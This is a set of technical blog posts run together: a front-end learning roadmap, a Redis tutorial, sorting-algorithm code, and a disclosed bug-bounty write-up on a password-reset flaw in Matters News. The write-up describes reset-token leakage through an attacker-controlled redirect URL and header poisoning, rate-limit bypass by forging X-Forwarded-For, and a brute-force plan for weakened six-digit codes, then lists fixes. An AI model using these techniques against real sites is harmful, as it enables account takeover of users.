using any preprocessor 15. Asynchronous History: Callbacks, Promises, and Async&#x2F;AwaitIn the eighth point “Asynchronous and AJAX,” we learned about the concept of Callbacks. This can be extended to learn about Promises, as well as the newer async&#x2F;await syntax, which are all closely related to the concept of asynchronous. Learning ReasonsIn JavaScript, understanding the use and development history of these things is quite important, so I specifically gave this topic a section, after all, these things should be learned together. The reason for learning is that many things in JavaScript are asynchronous, and now almost all use Promise to handle asynchronous problems, so understanding these syntaxes can know how to use them. Learning Objectives Know how to use Promise Know how to use .then and .catch Know how to “simultaneously” execute multiple Promises Know how to “sequentially” execute multiple Promises Know how to use async&#x2F;await 16. In-depth Understanding of JavaScript and Browser-related MechanismsIn the previous sections, we learned more about tools that allow us to build our own products using them. But in addition to tools, the underlying principles are also important. Learning the principles and some more low-level concepts will make you more confident in these technologies, and you will have more places to think about when problems arise. For example, sometimes the problems encountered may have nothing to do with JavaScript itself, but rather the browser’s operating mechanism that leads to such results. If you don’t know what the browser is doing at all, you may be stuck in “the problem must be here!” but in fact it is not. The recommended learning resource here is How Browsers Work: Behind the scenes of modern web browsers, where you can see how modern browsers work. There is also the Inside look at modern web browser series that Chrome launched when it was about 20 years old, which can greatly enhance your understanding of the browser. If your English is not good, you can find unofficial Chinese translation versions of these articles. Finally, I also recommend a course that Google offers on Udacity: Website Performance Optimization, which will mention the process of parsing HTML by the browser and the order of loading resources, etc. As for the JavaScript part, you can start with some common problems, such as closure, scope, this, hoisting, etc., which are all common keywords. Here, I recommend the popular JavaScript: Understanding the Weird Parts, as well as You Don’t Know JS and five related articles I wrote before: It’s time to understand the prototype chain in JavaScript In-depth discussion of parameter passing in JavaScript: call by value or reference? I know you understand hoisting, but how deep do you understand? All functions are closures: discussing scope and closure in JS A brief discussion on JavaScript’s number one difficulty: this - not complete, but guaranteed to be easy to understand Learning ReasonsIn addition to using tools, you also need to know the principles behind the tools. This will help you locate problems more accurately when they occur. I think JavaScript is important for beginners, although sometimes they may not feel it. Many times, beginners will write related bugs and encounter similar problems, but because they lack these abilities, they don’t know how to find out where the problem is and how to debug it. Learning Objectives Know what is scope You know what Hoisting is You know the principle of Hoisting You know what Closure is You can give an example of using Closure You know what Prototype is in JavaScript You know what the value of this is in most cases 17. gulp and webpackAs the project becomes larger and larger, you may need some tools to assist in development. gulp can manage workflows and can be used to perform a series of tasks, such as: Convert SCSS to CSS Compress CSS files Convert ES6 to ES5 using babel Compress JS files Change all images in HTML to webp format gulp is just a workflow manager, and the above functions require the installation of corresponding plugins to be used successfully. Webpack, on the other hand, is a completely different thing. It is a packaging tool. In the past, the native browser did not support the import and export syntax written in Node.js (now it is supported), so a packaging tool must be found to do this. One of the purposes of webpack is this. However, in addition to this, it regards “packaging” as a broader concept. Everything is a resource, not just JS files. As long as it is a resource, it can be packaged by webpack, and some things can be done through webpack’s plugins during the packaging process, such as converting SCSS to CSS or compressing JS files. The reason why these two are put together is that these two are often confused, but I think it can be seen very clearly that they are fundamentally different. gulp itself is useless, it is just a task manager, and the real focus is on what tasks are executed below; webpack is a packaging tool that can package your front-end project. In the packaging process, resources can also be transformed through webpack’s plugins. If you really understand these two things, you will know that webpack can also be executed as one of gulp’s tasks. Learning ReasonsWhy learn these two things? I think it’s okay not to learn gulp, but the concept is not difficult and the threshold is not high. It is also very good to learn. And often confused with webpack, after learning, it can better explain the similarities and differences with webpack. The real focus is actually webpack. I think understanding what webpack is doing is one of the key points to enter modern front-end development. Because almost all front-end frameworks use webpack for packaging, if you don’t learn webpack, you will never understand what they are doing. Learning Objectives Know the purpose and principle of gulp Know the purpose and principle of webpack Familiar with how to use webpack for modular development Familiar with how to use gulp to construct automated workflows 18. Object-orientedI really don’t know where to put object-oriented things, so I can only put them in front of the framework. In fact, the concept of object-oriented can be slowly cultivated in the previous process, such as using XMLHttpRequest or using Promise, there are object-oriented concepts in them. Here you need to learn the basic concepts of object-oriented, as well as how to use ES6’s Class syntax and inheritance. If you have time, you can also learn ES5’s prototype, after all, JavaScript is prototype-based, and Class is just syntactic sugar. If you really want to learn object-oriented, there are many things you can learn. When you start learning, you will be overwhelmed by a lot of new terms, but it is recommended to learn some more common or commonly used ones in JavaScript, such as inheritance and encapsulation. As for polymorphism or overloading, you can put it aside for a while, just have a concept, and go deeper into learning in the future if you have the opportunity. Learning ReasonsBefore entering the front-end framework, you must have the concept of object-oriented, otherwise you will not understand what a lot of usage is doing. Learning Objectives Know what is Class Know the difference between Class and Instance Know what is super() Know how to use ES6 Class and write simple object-oriented programs Know what is Inheritance 19. Choose one from React&#x2F;Vue&#x2F;AngularAfter learning so much, we are finally approaching the end of this learning path. It’s time to learn front-end frameworks (React is not strictly a framework, but I think it can be considered as one when combined with the entire ecosystem, so I’ll call it a framework here). For learning, you can choose one of the three major frameworks: React&#x2F;Vue&#x2F;Angular. Vue seems to be easier to get started with, but I only know React and I recommend it. I have never used the other two, and I recommend learning React simply because I like it (yes, it’s a weak reason). I recommend starting with The Road to learn React, which I think is an invaluable resource. The first four lessons are the essence, which teach you how to learn React without directly teaching React. After that, you can check out the official tutorial, which is also very comprehensive. To master the core concepts and basic usage of front-end frameworks, for example, in React, the core concept is that the state corresponds to the UI. If you want to change the UI, just change the state. The UI is just a presentation of the state, so basically you won’t directly manipulate the UI, but change the state and let React redraw the UI for you. In addition, Component and JSX are also important concepts, and you must also understand React’s lifecycle methods. In short, once you enter modern front-end development, you are almost there. If you have learned everything mentioned above, you are already a decent web front-end engineer in my mind. Reasons for LearningWhy put front-end frameworks at the end? Because I think it is necessary to have a foundation for learning these front-end frameworks. Without a foundation, you will only end up in a mess and not know what you are learning. At least you should be proficient in using JavaScript and understanding object-oriented programming, and you should also know a little about basic webpack before learning front-end frameworks. I think frameworks are not something for beginners. Please build a foundation before learning frameworks, so that you can achieve twice the result with half the effort. Learning frameworks directly is half the effort for twice the result. Please take it step by step. Many beginners learn frameworks too early, which leads to not knowing whether the problem is with the framework or with JavaScript itself, which I call an unstable foundation. Learning Objectives (Using React as an example) Know the purpose and principle of React Know why we need React Know the difference between using React and using jQuery Understand the difference between state and props Be familiar with basic operations in React ConclusionIs there a lot to learn? Yes, but this is just the beginning, and there are many topics I haven’t mentioned. The above are just what I consider to be the basics, and each basic can lead to many deeper topics. For example, when a React project becomes larger, you will encounter some state management issues, which lead to Redux and some Redux middleware. Or CSS will become more complicated as you write more, and you will encounter some CSS methodologies such as OOCSS, SMACSS, BEM, and Functional CSS. I haven’t mentioned web performance optimization yet, such as gzip, Cache, CDN, HTTP&#x2F;2 on the server side, lazy loading, image compression, PRPL Pattern, or code splitting on the front end. There are too many things to learn and research. Is it easy to become a web front-end engineer? It depends on your own standards for this profession. If you just want to find a job titled “web front-end engineer”, I don’t think it’s very difficult in the current situation. As I said at the beginning, if you are oriented towards quick job hunting, you don’t need to learn many of the things I mentioned. But if you want to build a better foundation for yourself and make your future smoother, it is certainly not an easy task. It is easy to become an engineer, but it is another matter to become an engineer with a solid foundation. I hope this long list will be helpful to those who want to learn web front-end or strengthen their web front-end foundation. Finally, thanks to my friends who helped me review the article and gave me suggestions.","link":"/2019/08/21/en/real-front-end-learning-path/"},{"title":"How a flawed password reset mechanism can lead to account takeover vulnerabilities? Matters as an example","text":"Password reset is a mechanism that almost all websites have. The most common way is to send a password reset link via email, and after clicking the link, the user can set a new password for the account. Although this mechanism is common, there are some small security details to pay attention to. This time, I am going to write about an account takeover vulnerability caused by the password reset function that I reported at the end of June this year. Matters News is a decentralized writing community platform that uses encrypted currency-related technology. I have written an article before, Preventing XSS May Be Harder Than You Think, sharing how I found their XSS vulnerability. Before discussing this vulnerability, let’s take a look at how the general password reset function is designed. By the way, if you are curious why you can only reset the password instead of “retrieve password” when you forget your password, you can refer to this article: Why can only reset password when forgetting password, not tell me the old password? Typical password reset functionBasically, the process of forgetting the password is similar: The user enters the email used when registering the account. The system sends a password reset link to the email in step 1. The user clicks the link in the email to go to the password reset page. The user enters a new password and submits the form. The password is reset successfully, and the user can log in with the new password. If this process is to be secure, it must ensure that: The destination of the email sent by the system is the user’s email. The password reset link cannot be guessed. Let’s first talk about the first point. Some people may say, “Isn’t this basic? I enter &#x75;&#115;&#x65;&#114;&#x40;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#x6d;, and of course, the email will be sent to &#x75;&#115;&#x65;&#114;&#x40;&#101;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#46;&#99;&#x6f;&#109;!” No, not necessarily. Some systems can receive an array as the email parameter, so you can enter: [&quot;victim@example.com&quot;, &quot;attacker@example.com&quot;], and then the attacker will receive the password reset email of the victim! It sounds incredible, but it has indeed happened: Ability to reset password for account Full account takeover of any user through reset password Next, let’s talk about the second point. If the password reset link can be guessed, it means that the attacker can reset the password on behalf of the user. Or more precisely, the password reset token cannot be guessed. For example, if the password reset link looks like this: https://example.com/reset-password?token=user@example.com, then I can reset the password for anyone, which is obviously insecure. Therefore, in general, the token will generate a unique id, such as UUID v4, which looks like this: 2c59d26a-f99a-425e-bb69-91e7c6ffe54d, with 128 bits, which is 2^128 combinations, and the probability of guessing it is very small. If the strength of the generated token is not enough, it will increase the probability of successful brute force cracking. However, it should be noted that even so, some system vulnerabilities are elsewhere, such as when sending emails, the password reset URL or host can be controlled! For example, as long as X-Forwarded-Host: abc.com is added in the request header, the password reset link will become: https://abc.com/reset-password?token=.... If the user clicks the link carelessly after receiving the email, the token will be sent to the attacker’s server, and he can still use this token to reset the password and take over the account. This has also happened in actual cases: Password Reset link hijacking via Host Header Poisoning Email link poisoning &#x2F; Host header attack Apart from these, there are many small details to pay attention to, such as: The reset password token should only be used once. The reset password token should have an expiration time. If the user generates a new reset password token, the old one should be invalidated. These limitations are in place to reduce the feasibility of brute-force attacks. If time were unlimited, theoretically brute-force attacks could guess the token, so the key to preventing brute-force attacks is twofold: one is to increase the time required for cracking, making it long enough to exceed a thousand years or more, and the second key is to limit the time. There are several ways to do this, such as: Increase the base, for example, the possibility of a six-digit number is only one million, but if it is changed to a six-digit alphanumeric, there are 2 billion possibilities, and the number of guesses increases by 2000 times, requiring more time. Reduce the guessable time, for example, the token will expire after 300 seconds. If there are 100 million possibilities, then 300,000 guesses per second must be made to ensure success. Next, let’s take a look at what happened to Matters’ reset password mechanism. Matters’ Reset Password MechanismThe following image is the interface for resetting the password on Matters. You enter your email and then a link is sent to your mailbox: The reset password request looks like this: &#123; \"operationName\":\"SendVerificationCode\", \"variables\":&#123; \"input\":&#123; \"email\":\"user@example.com\", \"type\":\"password_reset\", \"redirectUrl\":\"https://matters.news/forget?email=user%40example.com\" &#125; &#125; &#125; This is the link I received: https://matters.news/forget?email=user%40example.com&amp;code=UYBQ912rhd_9s3TfywZnk1kQl6PCaDjPlXuNX3Df&amp;type=password_reset From here, we can see the first problem, which is that the front half of the received link is controlled by redirectUrl. If we intercept the request and modify the redirectUrl parameter to https://cymetrics.io, we will find that the link received in the mailbox does start with https://cymetrics.io! In this way, we have the vulnerability mentioned earlier. If the user clicks the link in the email, our server will receive the token and can reset the user’s password. Next, let’s see if there is a brute-force attack problem. The token itself looks quite complex, with a length of 40 characters composed of uppercase and lowercase letters, numbers, and underscores. Although it doesn’t seem to be a problem, Matters is open source, so we can directly see how SendVerificationCode is implemented. The code is here: https://github.com/thematters/matters-server/blob/v3.19.0/src/mutations/user/sendVerificationCode.ts We are concerned with where the code is generated, mainly this part: // insert record const &#123; code &#125; = await userService.createVerificationCode(&#123; userId: viewer.id, email, type, strong: !!redirectUrl, // strong random code for link &#125;) And the code for userService.createVerificationCode is here: https://github.com/thematters/matters-server/blob/v3.19.0/src/connectors/userService.ts#L1500 createVerificationCode = (&#123; userId, email, type, strong, expiredAt, &#125;: &#123; userId?: string | null email: string type: string strong?: boolean expiredAt?: Date &#125;) => &#123; const code = strong ? nanoid(40) : _.random(100000, 999999) return this.baseCreate( &#123; uuid: v4(), userId, email, type, code, expiredAt: expiredAt || new Date(Date.now() + VERIFICATION_CODE_EXIPRED_AFTER), &#125;, 'verification_code' ) &#125; From here, we see a key point, which is that the code generation in the system is divided into two types: strong is nanoid(40), and not strong is a six-digit number from 100000 to 999999. The strong parameter is determined by whether redirectUrl is passed in. That is to say, if we remove the redirectUrl parameter when creating the reset password verification code, the code will instantly drop from 40 characters to a six-digit number! The verification code’s expiration time VERIFICATION_CODE_EXIPRED_AFTER is five minutes, or 300 seconds. 900000&#x2F;300 &#x3D; 3000. If we can send 3000 requests per second to the server, we can brute-force the reset password token and then take over the user’s account. But this statement is not very accurate because we can send 3000, but it does not mean that the server can handle 3000. Therefore, we also need to consider the number of requests the server can accept, and there is another limitation to overcome before that. Rate LimitingOne way to increase the difficulty of brute-force attacks is rate limiting, which many websites or WAFs have to prevent a large number of requests in a short period. Matters’ rate limit is handled by nginx, and the code is here: https://github.com/thematters/matters-server/blob/v3.19.0/.ebextensions/rate-limit-connections.config limit_req_zone $http_x_forwarded_for zone&#x3D;application:16m rate&#x3D;5r&#x2F;s; limit_req zone&#x3D;application burst&#x3D;20 nodelay; limit_req_status 429; limit_conn_status 429; # pass real IP from client to NGINX real_ip_header X-Forwarded-For; set_real_ip_from 0.0.0.0&#x2F;0; server &#123; # set error page for HTTP code 429 error_page 429 @ratelimit; location @ratelimit &#123; return 429 &#39;[&quot;Connection Limit Exceeded&quot;]\\n&#39;; &#125; listen 80; # 底下省略 &#125; Nginx’s rate limit is mainly based on IP. If you really want to bypass it, you can try IP rotate. A simple way is to open many API gateways on AWS as proxies, and then you have a bunch of different IPs that can be used in rotation. But we don’t need this technique here because we can see from the settings that it uses the $http_x_forwarded_for parameter. If it is not managed properly, you can pass in X-Forwarded-For to forge any IP and bypass the rate limit. Matters obviously didn’t set it up properly, so the rate limit is virtual. By doing this, as long as we can send 3000 requests per second, we can make a POC to prove that the attack is indeed feasible. But are there any other ways to reduce this number? Simultaneous Verification CodesAt the beginning, I mentioned that there are some details to pay attention to when resetting the password, such as: The reset password token should only be used once. The reset password token should have an expiration time. If the user generates a new reset password token, the old one should be invalidated. Matters has done the first two points, but not the third. From the code, we can see that when a new verification code is created, the old one is not deleted or marked as invalid. What impact will this have? Let’s do some simple math! There are a total of 900,000 combinations of verification codes. We have 300 seconds to attack. If we can send 900,000 requests during this time and the server can handle them, we can definitely guess the reset password verification code. If we change it to not guess first, but send 1000 reset password requests, because the old verification code is still valid, we can guess once, and the probability of guessing any one combination is 1000&#x2F;900000 &#x3D; 1&#x2F;900, which is 1000 times the original probability. If we guess 1000 times, the probability of guessing correctly is “1 - the probability of not guessing correctly each time”, which is approximately 1 - (899/900)^1000 &#x3D; 67%. If we guess 5000 times, the probability of guessing correctly is 1 - (899/900)^5000 &#x3D; 99.6%. In other words, as long as we send 1000 reset password requests plus 5000 confirmation code requests, a total of 6000 requests, we have a 99.6% chance of correctly guessing at least one verification code! We can write a simple program to verify our probability calculation: const _ = require('lodash') const rounds = 100000 // 跑十萬輪取平均 const guessRounds = 5000 // 猜 5000 次 const tokenCount = 1000 // 1000 個合法驗證碼 let winCount = 0 for(let r=0; r&lt;rounds; r++) &#123; let ans = &#123;&#125; for(let i=0; i&lt;tokenCount; i++) &#123; ans[_.random(100000, 999999)] = true &#125; let isWin = false for(let i=0; i&lt;guessRounds; i++) &#123; const guessNumber = _.random(100000, 999999) if (ans[guessNumber] === true) &#123; isWin = true break &#125; &#125; if (isWin) winCount++ &#125; console.log(winCount*100 / rounds) // 輸出：99.626，我們算出的機率差不多 Originally, we had to send 900,001 requests to have a 100% chance of guessing correctly. Now, by sacrificing a little accuracy and reducing the probability to 99.6%, we can reduce the number of requests to 6000, which is 150 times lower! Originally, we had to send 3000 requests per second in five minutes, but now we only need 20 requests per second (in fact, this is only a rough calculation because there is a sequence, and we must wait for the 1000 verification code requests to end before we can start guessing, and these 1000 requests may take a few seconds, but for convenience, we ignore them here, which has little effect on the overall situation). Just because of this small flaw in the reset password, not eliminating the previous verification code, we can generate multiple verification codes, greatly reducing the difficulty of brute force cracking. As long as we can send 6000 requests in five minutes, we have a 99.6% chance of changing the password of one account correctly. Since this is the reset password function, after changing the password, you can directly log in to the system with their identity and achieve account takeover, making other people’s accounts all yours. If you want to expand your influence, you can take over the administrator’s account, and then you have the opportunity to enter the management background for more operations. Suggested FixesThe first thing to fix is the small flaw in resetting the password. When the user generates a new verification code, the old one should be eliminated to ensure that only the latest one can pass the verification, so the probability of the attacker guessing correctly is always 1&#x2F;n, and it will not be like the example above, which can increase the probability by 1000 times or more. The second is that the generation of verification codes should not be determined by the redirectUrl parameter, but should be determined by the type of verification code. If it is a reset password, it must be strong, so nanoid(40) will be used to generate it, and the probability of guessing correctly will become very small, greatly reducing the feasibility of brute force cracking. The third is that the redirectUrl should not be passed in from the front end, but should be written directly in the back end. If it really needs to be passed in from the front end, the back end should do a good job of comprehensive checks to ensure that the redirectUrl passed in is a legal path, not allowing attackers to pass in any URL (but if the attacker can combine open redirect, it is another matter). The last one is that the rate limit restriction of nginx should not be determined by X-Forwarded-For. Even if it is really necessary to use this, make sure that its value cannot be passed in by the attacker. SummaryThe password reset mechanism seems simple, but it is still possible to create vulnerable mechanisms carelessly, which allows attackers to take advantage of them. There is a page on HackTricks that specifically discusses possible issues with reset password: Reset&#x2F;Forgotten Password Bypass. In addition to the issues mentioned in this article, there are many more issues that are detailed and worth referring to. If you think that only ordinary websites will have such problems, then you are wrong. A security researcher, Laxman Muthiyah, found that he could bypass the rate limiting of Instagram by using concurrent methods, successfully sending 200 requests, and generating 200,000 requests with 1,000 machines, with a 20% chance of success. As long as there are 5,000 machines, any account can be taken down. 5,000 machines may sound like a lot, and the cost should be high, right? But if cloud services are used wisely, he estimates that it may only cost about $150 to achieve an attack (because it is charged by the hour, and only needs to be opened for one or two hours). He also used the same method to bypass the rate limiting of Microsoft in July last year and won a $50,000 prize. If this kind of vulnerability can be successfully exploited, it can directly take over someone else’s account, which has a significant impact and requires more attention to related security. Seeing this, everyone may also want to check whether their own password reset mechanism is secure. Finally, after finding the vulnerability, it was also reported to Matters. The complete timeline is as follows: 2021-06-24 Reported the vulnerability to Matters 2021-06-25 Received a reply from Matters confirming the existence of the vulnerability 2021-08-20 Matters fixed some functions and will eliminate old verification codes when generating new ones 2021-08-26 Matters confirmed the vulnerability rating as High and awarded a bounty of 150 USD 2021-10-28 Inquired about the follow-up repair status and confirmed whether it was repaired 2021-11-30 Matters strengthened the base of non-strong verification codes 2021-12-02 Completed the initial draft of the article and confirmed with Matters whether it can be published 2021-12-21 Matters confirmed that the issue has been fully repaired and the article can be published.","link":"/2022/01/04/en/reset-password-vulnerability/"},{"title":"Redis: The Perfect Companion for Databases","text":"IntroductionRedis is an in-memory key-value database, often used for caching data to reduce the load on the backend database. This article will briefly introduce some of the useful features of Redis and where it can be applied. Common CommandsRedis’s official website lists every supported command. Let’s start with the simplest: SET, GETredis&gt; SET mykey &quot;Hello&quot; redis&gt; GET mykey &quot;Hello&quot; As mentioned earlier, Redis is a key-value pair database. Therefore, the simplest SET is to set the value of a certain key, and to retrieve it, use GET. INCR, DECRredis&gt; SET mykey &quot;10&quot; redis&gt; DECR mykey (integer) 9 redis&gt; INCR mykey (integer) 10 As the name suggests, it means to add or subtract one to a certain key, like mykey++ and mykey-- in programming languages.There is also INCRBY and DECRBY, which allows you to specify the amount you want to add or subtract. HSET, HGETredis&gt; HSET mydata name &quot;nick&quot; redis&gt; HSET mydata nickname &quot;nicknick&quot; redis&gt; HGET mydata name &quot;nick&quot; H stands for Hashmap, so you can access the field under a value, allowing you to use it more flexibly. For example, you can define the rule of the key as: POST + article id, and store the number of likes, replies, etc. of this article inside, so you don’t have to fetch it from the database every time. SADD, SCARDredis&gt; SADD myset &quot;nick&quot; redis&gt; SADD myset &quot;peter&quot; redis&gt; SADD myset &quot;nick&quot; redis&gt; SCARD myset (integer) 2 SADD’s S stands for Set, which refers to the Set data structure you learned in school, where there is no duplicate content. LPUSH, RPUSH, LSET, LRANGEredis&gt; LPUSH mylist &quot;a&quot; redis&gt; LPUSH mylist &quot;b&quot; redis&gt; RPUSH mylist &quot;c&quot; redis&gt; LRANGE mylist 0 -1 1) &quot;b&quot; 2) &quot;a&quot; 3) &quot;c&quot; redis&gt; LSET mylist 0 &quot;d&quot; redis&gt; LRANGE mylist 0 -1 1) &quot;d&quot; 2) &quot;a&quot; 3) &quot;c&quot; The data structure here is List, and you can choose to push values from the left or right, corresponding to the commands LPUSH and RPUSH. LSET specifies the value of a certain index. LRANGE can print out the specified range of values, supporting the -1 format, which represents the last value. Practical ApplicationsRedis is useful because of its speed. Therefore, if you encounter situations that require high speed in development, you can consider whether Redis can help you. Here are a few examples that I have actually used. URL Shortening SystemThe principle of URL shortening is very simple, which is a hash corresponding to a URL. The hash is randomly generated, and the number of digits or symbols can be determined by yourself. Then, store this set of corresponding relationships in the database. When someone queries the corresponding key, you just redirect to the corresponding URL. Because it is a one-to-one relationship of key-value, it is very suitable for using Redis.If you don’t use a key-value cache like Redis, you must query from the database “every time”. If the amount of data is small, it’s okay, but when the amount of data increases, the time will definitely increase, and the load on the database will also increase. Therefore, introducing a layer of cache between the database and the logic layer is a good choice. The implementation process is also very simple: The user adds a shortened URL, and the system randomly generates abc123 corresponding to http://techbridge.cc. Write key&#x3D;abc123, value&#x3D;http://techbridge.cc to the database. Same as above, but stored in Redis. When a user clicks on the URL abc123, first check if there is this key in Redis. If yes, redirect to the corresponding URL. If not, you have to query the database. After querying, remember to write a copy to Redis. If you have a lot of data and don’t want to spend a lot of money on a Redis Server with a large memory (databases store data on hard disks, while Redis stores data in memory, making databases much cheaper in terms of storage costs), you can use Redis’s Expire feature. When you store data, you can add an Expire time parameter. When this time is up, the key will be automatically cleared. For example, the expire time for a short URL can be set to 7 days. If a URL has not been visited by any user within 7 days, it will be automatically deleted. The advantage of this is that you can reduce memory usage by only keeping certain “hot data” in Redis, while storing other less popular or less frequently accessed data in the database, and writing it to Redis when it is accessed. Statistical SystemIn addition to the URL shortening feature, another key feature of a URL shortening service is statistical data. For example, Google’s URL shortening service provides information such as visit counts, charts, and device usage. These are the core features of a URL shortening service. To implement this feature, you need to record each request or at least the content of the request (such as the device used, time, and IP address) to have data to show users. If you read from the database every time, it will cause some performance issues. For example, every time you refresh the statistics page, you have to execute select count(*) from short_url where id=&quot;abc123&quot; to get the total number of visits. Do you remember INCR? This is where it comes in handy! You can define the key format yourself, for example, abc123:visit represents the total number of visits to the short URL abc123. Then, every time a request is made, execute INCR abc123:visit, and the number you need will be in this key, which can be read from Redis in the future. In addition to this, if you want to provide “non-repeating IP visit counts,” the Set mentioned earlier is very suitable. You can put the source IP of each request into a Set, and use SCARD to know how many unique IPs there are. It’s very convenient, isn’t it? High Real-time Ranking SystemI once worked on a project with the following requirements: Users can enter the website at noon and answer a question. After answering the question, they will see their ranking (sorted by answer time), and receive a prize based on their ranking. Only the top 300 users will receive a prize. Think about where you need to communicate with the database: When entering the website, check whether more than 300 people have already participated. If so, prompt that the event has ended (select count(*)...). Then check whether the user has answered the question. If so, display their ranking (select .. where id=..). If they haven’t answered the question, display the question page. After answering the question, display the user’s ranking (insert into .. id=..). Since only the top 300 users will receive a prize, if there are 10,000 users, the event may end within 10 seconds! Your database must “simultaneously handle” so many queries within 10 seconds, which may be a bit overwhelming. After careful examination, it will be found that many places do not need to use the database, or using Redis will be better! For example, you can plan it like this: Use a key isOver to store whether the event has ended. Use account as the key to store the user’s ranking. The above process can be rewritten as follows: When entering the website, read isOver from Redis to see if the event has ended. Check whether the user has answered the question by checking whether the user account key in Redis has data. If they haven’t answered the question and have answered it, write it to the database and write the ranking to Redis. If the user’s ranking is &gt;&#x3D;300, set isOver = true. Originally, three database operations were required, but now only the most necessary one is left, and the rest can be handled by Redis. Moreover, because Redis is an in-memory database, the response speed is very fast! In addition, since we don’t have many keys (just over 10,000), we use very little memory. Through the help of Redis, the problem of heavy database load that may be slow or even crash can be easily solved. ConclusionIf you have a project with a lot of users or need to return information quickly but are afraid that the database cannot handle it, consider using Redis or other caching services. In many cases, if caching is used properly, it can reduce the burden on the database and speed up response times. If you are interested in Redis, you can refer to the website Redis Design and Implementation.","link":"/2016/09/29/en/redis-introduction/"},{"title":"Reviewing Classic Sorting Algorithms with JavaScript","text":"IntroductionRecently, I just finished CS50 Week3, and the topic of this week is: Algorithms. It introduces several classic sorting algorithms, such as selection sort, bubble sort, insertion sort, and merge sort. As a software engineer, I think we can never escape from sorting algorithms. After all, this is one of the classic algorithms! Instead of preparing for interviews in a mess every time, it’s better to organize a post now to record the experience of each sorting algorithm and help ourselves to integrate. Therefore, this post will use JavaScript to implement various classic sorting algorithms. The sorting algorithms implemented this time will be sorted from small to large, and for convenience, each sorting algorithm “will directly modify the original array”. But if you don’t want to modify the original, it’s easy. Just add arr = arr.slice() at the beginning of each function to copy the original. Also, because it is difficult to put animations in the article, I can only put some pictures. If you want to learn with visualized algorithms, I highly recommend VISUALGO. This website will definitely take your understanding of sorting to the next level. Selection SortI think selection sort is the easiest sorting algorithm to understand because its principle is super simple: Find the minimum value and move it to the leftmost. After you finish the first round, you will find the minimum value of the entire array, and then you change the search range from 0 ~ n-1 to 1 ~ n-1 and repeat the same thing. Or, you can also think of it as: find the minimum value, the second smallest value, the third smallest value… the n-th smallest value. (Image source: http://cheetahonfire.blogspot.sg/2009/05/selection-sort-vs-insertion-sort.html) const selectionSort = (arr) => &#123; const length = arr.length; // Find the minimum value for how many elements there are // Here, i represents that all elements before i are sorted for (let i = 0; i &lt; length; i++) &#123; // First assume that the first one is the smallest let min = arr[i]; let minIndex = i; // Find the minimum value from the unsorted elements for (let j = i; j &lt; length; j++) &#123; if (arr[j] &lt; min) &#123; min = arr[j]; minIndex = j; &#125; &#125; // ES6 syntax, swap two values [arr[minIndex], arr[i]] = [arr[i], arr[minIndex]]; &#125; return arr; &#125; The time complexity is the well-known O(n^2), and the best, worst, and average are all the same, because no matter how long the original array is, it has to go through so many rounds of comparison. Bubble SortBubble sort should be the first sorting algorithm that many people come into contact with, and the principle is also very simple and easy to understand: Compare with the neighbor, exchange the order if it is wrong, and let the larger elements keep moving to the end. It is the process of exchanging like this that makes it called “bubble” sort, because the elements are like “floating” up. (Image source: http://www.opentechguides.com/how-to/article/c/51/bubble-sort-c.html) const bubbleSort = (arr) => &#123; const n = arr.length; // A total of n rounds need to be run for (let i = 0; i &lt; n; i++) &#123; // Start from the first element and keep running to the n - 1 - i element // Originally it was n - 1, and - i was added because the last i elements have been sorted // So there is no need to compare with those sorted elements for (let j = 0; j &lt; n - 1 - i; j++) &#123; if (arr[j] > arr[j + 1]) &#123; [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]; &#125; &#125; &#125; return arr; &#125; Although the average and worst-case time complexity of Bubble Sort is O(n^2), it is worth noting that the best case occurs when the input array is already sorted. In this case, the time complexity is O(n), and no exchanges are made. However, if you want to achieve the best case of O(n), you must add a small optimization. Otherwise, in the case mentioned above, although no exchanges are made, every element is still checked. You can add a flag to indicate whether there is any exchange in the inner loop. If not, it means that the array is already sorted, and you can skip it directly. function optimzedBubbleSort = (arr) => &#123; const n = arr.length; let swapped = true; // A total of n rounds are required for (let i = 0; i &lt; n &amp;&amp; swapped; i++) &#123; // Start from the first element and keep running to the n - 1 - i th element // Originally n - 1, adding - i because the last i elements are already sorted // So there is no need to compare with those sorted elements swapped = false; for (let j = 0; j &lt; n - 1 - i; j++) &#123; if (arr[j] > arr[j + 1]) &#123; swapped = true; [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]; &#125; &#125; &#125; return arr; &#125; After the improvement, if the input is already sorted, the inner loop will only run once and then skip, so the time complexity will be O(n). Insertion SortInsertion Sort is a sorting algorithm that I think is quite intuitive. In short: The sorting algorithm you use when playing poker It’s just constantly inserting cards into the appropriate position, but when you play cards, you may insert many cards at once, while Insertion Sort inserts one card at a time. (Image source: https://commons.wikimedia.org/wiki/File:Insertion-sort-example.gif) What is worth noting here is the algorithm for insertion. Continuously find the appropriate position and move the elements while finding, so you can insert directly when you find it. const insertionSort = (arr) => &#123; const n = arr.length; // Assuming that the first element is already sorted, start from 1 for (let i = 1; i &lt; n; i++) &#123; // position indicates the position where it can be inserted let position = i; // First save the element to be inserted const value = arr[i]; // Start looking forward, as long as this condition is met, it means that this position can be inserted // You can move the element backward while looking for it to make room while (i >= 0 &amp;&amp; arr[position - 1] > value) &#123; [arr[position], arr[position - 1]] = [arr[position - 1], arr[position]]; position--; &#125; // Find the appropriate position and insert the element arr[position] = value; &#125; return arr; &#125; The best case of Insertion Sort occurs when the input elements are already sorted. In this case, the while loop inside only runs once, so the time complexity is only the outer loop’s O(n). Here’s a little anecdote. When I was writing the demonstration and testing code, I didn’t write it well, so the arrays used for testing were already sorted. I thought, “Why is Insertion Sort faster than Quick Sort? It doesn’t make sense!” Merge SortNext, we will move on to a faster sorting algorithm, Merge Sort, which is relatively easy to understand: Cut in half, sort the left and right sides, and merge them. When talking about Merge Sort, I like to talk about the merge step first, which is to merge two separately sorted arrays into one. This step is actually quite simple because both sides are already sorted, so just keep looking at the first element of both sides and grab the smaller one. Then, grab the remaining elements from the left or right side. I previously found a version of merge sort that is easier to understand but consumes more space: const simpleMergeSort = (arr) => &#123; // Merge const merge = (leftArray, rightArray) => &#123; let result = []; let nowIndex = 0, left = 0, right = 0; const leftLength = leftArray.length; const rightLength = rightArray.length; // If both left and right sides are not empty, compare and add the smaller one to the result array while (left &lt; leftLength &amp;&amp; right &lt; rightLength) &#123; if (leftArray[left] &lt; rightArray[right]) &#123; result[nowIndex++] = leftArray[left++]; &#125; else &#123; result[nowIndex++] = rightArray[right++]; &#125; &#125; // If one side is empty, add the remaining elements from the other side to the result array while (left &lt; leftLength) 